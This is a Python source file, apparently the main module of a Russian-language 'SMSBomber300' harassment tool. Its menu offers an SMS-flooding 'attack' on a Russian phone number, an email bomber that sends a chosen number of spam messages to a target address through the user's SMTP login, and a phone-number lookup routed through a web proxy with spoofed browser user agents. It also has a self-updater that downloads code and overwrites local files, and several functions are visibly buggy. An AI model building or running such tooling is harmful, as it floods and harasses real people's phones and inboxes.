import requests, random, datetime, sys, time, argparse, os , colorama ,pickle
from Banners import banner1an, banner2an, banner3, banner4
import fake_useragent
from threading import Thread
from fake_useragent import UserAgent
from ServesSMS import _sms
from Message import *
import smtplib as root
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from colorama import *

oso = os.name
user_war = 15
_phones = []
user_instruct = '0'
version = '12.4'


def menu_atack():
	check_os()
	effect(message20)

	user_input = input('\n        [\033[32m>>\033[33m] ')

	if user_input == '1':
		send_sms()

	if user_input == '0':
		start()

	if user_input == '2':
		pass

	if user_input == '3':
		pass

	else:
		print('        [\033[31mx\033[33m] Пожалуйста введите нужный режим!')
		time.sleep(1)
		menu_atack()


def send_sms():
	check_os()
	phone = input('\n        Введите Российский номер для атаки с [\033[32m+7\033[33m]! \n\n        [\033[32m>>\033[33m] ')
	
	phone_check = phone.replace("+","")
	num_kol = len(phone_check)


	if num_kol == 11:
		time.sleep(1)
		_sms(phone_check)
		#_thread1 = Thread(target=_sms, args=(phone_check))
		#_thread1.start()
		#_thread1.join()
		
	else:
		print('\n        [\033[31m!\033[33m] Пожалуйста проверьте валидность номера! \n        [\033[31m!\033[33m] Введите Российский номер!')
		time.sleep(3)
		sms_send()


def instruction():

	check_os()
	effect(message_instruct)

	user_input = input('\n        Для выхода напишите [\033[31m0\033[33m] \n\n        [\033[32m>>\033[33m] ')

	if user_input == '0':
		start()


def check_update():
    print(Fore.YELLOW)
    global version
    effect(message15)

    updat=requests.get('https://raw.githubusercontent.com/Ivan-Zaitsev/SMSBomber300/master/version.data')
    updat_vers = float(updat.text[0:6])
    
    if updat_vers > float(version):
        print("\n        [\033[32m!\033[33m] Найдено обновление\n" + updat.text[0:6] + "\n        [\033[32m+\033[33m] Изменения:\n" + updat.text[7:])
        print("\n        [\033[32m!\033[33m] Начато обновление, пожалуйста подождите!")
        
        up_boom = requests.get('https://raw.githubusercontent.com/Ivan-Zaitsev/SMSBomber300/master/SMSBomber300.py')
        f = open("SMSBomber300.py", "wb")
        f.write(up_boom.content)
        f.close()
        print('\n        [\033[32m+\033[33m] Файл SMSBomber300.py обновлен!')
        time.sleep(1)

        up_function = requests.get('https://raw.githubusercontent.com/Ivan-Zaitsev/SMSBomber300/master/Function.py')
        f2 = open("Function.py", "wb")
        f2.write(up_function.content)
        f2.close()
        print('\n        [\033[32m+\033[33m] Файл Function.py обновлен!')
        time.sleep(1)


        up_banners = requests.get('https://raw.githubusercontent.com/Ivan-Zaitsev/SMSBomber300/master/Banners.py')
        f3 = open("Banners.py", "wb")
        f3.write(up_banners.content)
        f3.close()
        print('\n        [\033[32m+\033[33m] Файл Banners.py обновлен!')
        time.sleep(1)


        up_message = requests.get('https://raw.githubusercontent.com/Ivan-Zaitsev/SMSBomber300/master/Message.py')
        f4 = open("Message.py", "wb")
        f4.write(up_message.content)
        f4.close()
        print('\n        [\033[32m+\033[33m] Файл Message.py обновлен!')
        time.sleep(1)


        up_servissms = requests.get('https://raw.githubusercontent.com/Ivan-Zaitsev/SMSBomber300/master/ServesSMS.py')
        f5 = open("ServesSMS.py", "wb")
        f5.write(up_servissms.content)
        f5.close()
        print('\n        [\033[32m+\033[33m] Файл ServesSMS.py обновлен!')
        time.sleep(1)


        up_serviscall = requests.get('https://raw.githubusercontent.com/Ivan-Zaitsev/SMSBomber300/master/Servis-Call.py')
        f6 = open("Servis-Call.py", "wb")
        f6.write(up_serviscall.content)
        f6.close()
        print('\n        [\033[32m+\033[33m] Файл Servis-Call.py обновлен!')
        time.sleep(1)

        
        print("\n        [\033[32m!\033[33m] Обновление завершено, откройте бомбер заново командой 'python SMSBomber300.py' [\033[32m!\033[33m]")
        time.sleep(1)
        sys.exit()
    
    elif updat_vers == float(version):
    	print("\n        [\033[32m!\033[33m] Установлена последняя версия, спасибо!")
    
    elif updat_vers < float(version):
    	print("\n        [\033[32m!\033[33m] Ты молодец, пиши мне в вк!")
    	sys.exit()
    
    else:
    	print("\n        [\033[31mx\033[33m] Ошибка, файл обновлений не найден!  \n        Попробуйте заново или проверьте подключение к интернету.")




def check_os():
	if oso == "posix":
		os.system("clear")
		banner3()
	else:
		os.system("CLS")
		banner4()

def effect(message):
	for char in message:
	    sys.stdout.write(char)
	    sys.stdout.flush()

def check_ins():
	if user_instruct == '0':
		print('        [\033[31m!\033[33m] ПЕРЕД ИСПОЛЬЗОВАНИЕМ ОЗНАКОМЬТЕСЬ С ИНСТРУКЦИЕЙ [\033[31m!\033[33m]')
	else:
		pass

def us_input():
	check_ins()
	user_input = input('\n        [\033[32m>>\033[33m] ')
	if user_input == '1':
	    menu_atack()
	if user_input == '2':
	    create_server()
	    probiv_user()
	if user_input == '3':
	    Setting()
	if user_input == '4':
		book_phones()
	if user_input == '5':
		send_mail()
	if user_input == '6':
		user_instruct += '5'
		instruction()
	if user_input == '0':
		sys.exit()
	else:
		print('        [\033[31mx\033[33m] Пожалуйста введите нужный режим!')
		us_input()
	input()

def us_input_setting():
	user_setting = input("\n        [\033[32m>>\033[33m] ")
	if user_setting == str(2):
	    kol2 =  input("\n        [\033[32m!\033[33m] Хорошо введите время не больше 20 секунд ! \n\n        [\033[32m>>\033[33m] ")
	    effect(message1)
	    return user_setting
	if user_setting == str(1):
		effect(message8)
	if user_setting == str(0):
		start()
	else:
		print('\n        [\033[31mx\033[33m] Пожалуйста введите нужный режим!')
		us_input_setting()

def parametrs_logins():
	for x in range(18):
		_name = _name +  random.choice(list("abcdefghijklmnopqrstuvwxyz"))
		name = _name + random.choice(list("abcdefghijklmnopqrstuvwxyz"))
		_email  = _name + random.choice(list("abcdefghijklmnopqrstuvwxyz"))
		_email += "@gmail.com"
		email  = _name + random.choice(list("abcdefghijklmnopqrstuvwxyz"))
		email += "@gmail.com"
		password  = _name + random.choice(list("abcdefghijklmnopqrstuvwxyz1234567890"))
		username  = _name + random.choice(list('abcdefghijklmnopqrstuvwxyz'))

def start():
	global user_instruct

	check_os()
	check_ins()
	effect(message)
	user_input = input('\n        [\033[32m>>\033[33m] ')

	if user_input == '1':
	    menu_atack()
	if user_input == '2':
	    create_server()
	    probiv_user()
	if user_input == '3':
	    Setting()
	if user_input == '4':
		book_phones()
	if user_input == '5':
		send_mail()
	if user_input == '6':
		user_instruct += '5'
		instruction()
	if user_input == '0':
		sys.exit()
	else:
		print('        [\033[31mx\033[33m] Пожалуйста введите нужный режим!')
		us_input()
	input()


def send_mail(): 
	check_os()


	login = input('\n\n        Введите логин почты [\033[32mTestmail347@gmail.com\033[33m]! \n\n        [\033[32m>>\033[33m]')
	password = input('\n\n        Введите пароль от почты ! \n\n        [\033[32m>>\033[33m]')
	url = input('\n\n        Введите сервер для отправки [\033[32msmtp.gmail.com\033[33m]! \n\n        [\033[32m>>\033[33m]')
	toaddr = input('\n\n        Введите почту для атаки! \n\n        [\033[32m>>\033[33m]')
	topic = input('\n\n        Введите тему сообщения спама! \n\n        [\033[32m>>\033[33m]')
	mess = input('\n\n        Введите сообщение спама! \n\n        [\033[32m>>\033[33m]')
	number_attack = input('\n\n        Введите количество писем! \n\n        [\033[32m>>\033[33m]')

	print('\n        [\033[32m!\033[33m] Пожалуйста подождите!\n')
	time.sleep(2)

	try:
		for value in range(int(number_attack)):
			msg = MIMEMultipart()

			msg['Subject'] = topic
			msg['From'] = login
			body = mess
			msg.attach(MIMEText(body,'plain'))

			server = root.SMTP_SSL(url,465)
			server.login(login,password)
			server.sendmail(login,toaddr,msg.as_string())
			server.quit()
		print('        [\033[32m!\033[33m] Атака закончена! Вы будите перенаправлены на главный экран через [\033[32m3 сек.\033[33m]\n')
		time.sleep(3)
		start()
	except:
		print('        [\033[31mx\033[33m] Ошибка! Пожалуйста проверьте правильность написания!\n')
		time.sleep(2)
		send_mail()








def render_phones():
	global _phones
	file_phone = open('phone.data', 'r')
	_phones = file_phone.readlines()
	file_phone.close()
	tips = 0
	
	for phones in _phones:
		print(phones)

def ui_user_book():
    menu = input('\n        [\033[32m>>\033[33m] ')

    if menu == '2':
    	print('\n\n        [\033[31m!\033[33m] Для удаления напишите порядковый номер номера !')
    	print('        [\033[31mx\033[33m] Для выхода напишите [\033[31m0\033[33m] ! \n\n')
    	render_phones()

    	menu_books = int(input('\n        [\033[32m>>\033[33m] '))
    	_phones.pop(menu_books)

    	file_phone = open('phone.data', 'w')
    	file_phone.write(f'{_phones}')
    	file_phone.close()

    	
    	if menu_books == '0':
    		start()


    if menu == '3':
    	render_phones()
    	print('\n\n        [\033[31mx\033[33m] Для выхода напишите [\033[31m0\033[33m] !')
    	menu_book = input('\n        [\033[32m>>\033[33m] ')

    	if menu_book == '0':
    		book_phones()
    
    if menu == "0": 
    	start()

    if menu == "1":
        phones = input("\n        [\033[32m!\033[33m] Введите номер: ")
        phones_name = input("\n        [\033[32m!\033[33m] Введите метку для номера: ")
        file_phone = open('phone.data', 'a')
        file_phone.write(f'\n{phones} - {phones_name}')
        file_phone.close()
        print('\n        [\033[32m!\033[33m] Номер успешно добавлен!')
        time.sleep(1)
    else:
        print('        [\033[31mx\033[33m] Пожалуйста введите нужный режим!')
        ui_user_book()








def book_phones():
    while True:
        check_os()
        effect(message10)
        ui_user_book()




def OSystem():
	if oso == "posix":
		os.system("clear")
		banner1an()
	else:
		os.system("CLS")
		banner2an()

def Setting():
	check_os()
	print("\n                  [\033[32mНАСТРОЙКИ\033[33m] ")
	print("        [\033[32m1\033[33m] Разработчики")
	print("        [\033[32m2\033[33m] Настройка времени показа баннера [\033[32mВ сек.\033[33m]")
	print("        [\033[31m0\033[33m] Выйти")
	us_input_setting()


def create_server():
	global SERVER
	SERVERS = ['us14','eu5','us1','us2','us3','us4','us5','us6','us7','us8','us9','us10','us11','us12','us13','us14','us15','us16','us17','eu1','eu2','eu3','eu4','eu5','eu6','eu7','eu8','eu9','eu10','eu11','eu12','eu13','eu14','eu15']
	SERVER = random.choice(SERVERS)

def probiv_user():
	check_os()
	phone_number = input('\n        Введите номер для поиска информации с [\033[32m+7\033[33m]! \n\n        [\033[32m>>\033[33m] ')
	phone_number_check = phone_number.replace("+","")
	num_kol = len(phone_number_check)

	try:
		if num_kol == 11:
			print('\n        Пожалуйста подождите [\033[32m3 сек.\033[33m]!')
			time.sleep(3)

			proxy_url = f'https://{SERVER}.proxysite.com/includes/process.php?action=update'
			url = f'https://htmlweb.ru/geo/api.php?json&telcodjson&telcod={phone_number}'

		    #requests
			ua = UserAgent()
			user_agent = ua.chrome
			headers = {'User-Agent': str(user_agent)}
			data = requests.post(proxy_url, headers=headers, data={
			    'server-option': SERVER,
		        'd': url,
		        'allowCookies': 'on',})

		    #info
			inf = data.json()["country"]["fullname"]
			inf2 = data.json()["0"]["name"]
			inf3 =data.json()["region"]["name"]
			inf4 = data.json()["region"]["okrug"]
			inf5 = data.json()["0"]["oper"] 
			inf6 = data.json()["country"]["location"]
			inf7 = data.json()["0"]["oper_brand"]
			inf8 = data.json()["country"]["telcod"]
			inf9 = data.json()["country"]["lang"]
			inf10 = data.json()["capital"]["english"]
			inf11 = data.json()["0"]["latitude"]
			inf12 = data.json()["0"]["longitude"]
			inf13 = data.json()["capital"]["telcod"]
			inf14 = data.json()["capital"]["wiki"]
			inf15 = data.json()["region"]["autocod"]
			inf16 = data.json()["country"]["telcod_len"]
			inf17 = data.json()["0"]["post"]

			print(f'''
    	[\033[32m1\033[33m] Номер сотового --> [\033[32m+{phone_number}\033[33m]
    	[\033[32m2\033[33m] Страна --> [\033[32m{inf}\033[33m]
    	[\033[32m3\033[33m] Город --> [\033[32m{inf2}\033[33m]
    	[\033[32m4\033[33m] Регион --> [\033[32m{inf3}\033[33m]
    	[\033[32m5\033[33m] Округ --> [\033[32m{inf4}\033[33m]
    	[\033[32m6\033[33m] Оператор --> [\033[32m{inf5}\033[33m]
    	[\033[32m7\033[33m] Часть света --> [\033[32m{inf6}\033[33m]
    	[\033[32m8\033[33m] Бренд оператора --> [\033[32m{inf7}\033[33m]
    	[\033[32m9\033[33m] Код Страны --> [\033[32m{inf8}\033[33m]
    	[\033[32m10\033[33m] Язык --> [\033[32m{inf9}\033[33m]
    	[\033[32m11\033[33m] Часовой пояс --> [\033[32m{inf10}\033[33m]
    	[\033[32m12\033[33m] Ширина --> [\033[32m{inf11}\033[33m]
    	[\033[32m13\033[33m] Долгота --> [\033[32m{inf12}\033[33m]
    	[\033[32m14\033[33m] Код --> [\033[32m{inf13}\033[33m]
    	[\033[32m15\033[33m] Википедия --> [\033[32m{inf14}\033[33m]
    	[\033[32m16\033[33m] Код региона --> [\033[32m{inf15}\033[33m]
    	[\033[32m17\033[33m] Длина номера --> [\033[32m{inf16}\033[33m]
    	[\033[32m18\033[33m] Почтовый индекс --> [\033[32m{inf17}\033[33m]''')

			print('        \n        Для выхода напишите [\033[31m0\033[33m]')
			
			user_logic = input('\n          [\033[32m>>\033[33m]')

			if user_logic == '0':
				start()
			else:
				time.sleep(1)
				start()

		else:
			print('        [\033[31mx\033[33m] Введите Российский номер из 11 символов ! ')
	except:
		print('        [\033[31mx\033[33m] Введите Российский номер из 11 символов ! ')
